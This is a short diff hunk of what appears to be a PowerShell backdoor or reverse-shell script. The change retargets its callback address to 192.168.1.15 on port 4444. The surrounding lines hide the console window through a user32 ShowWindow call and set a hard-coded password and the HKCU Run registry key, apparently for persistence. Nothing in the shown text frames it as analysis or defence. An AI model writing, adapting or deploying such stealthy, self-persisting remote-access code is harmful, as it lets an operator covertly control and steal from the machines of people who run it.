@@ -5,7 +5,7 @@ $code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h
 $win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
 $win32::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-$ip = '192.168.12.204'
+$ip = '192.168.1.15'
 $port = 4444
 $pass = "biskviti"
 $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
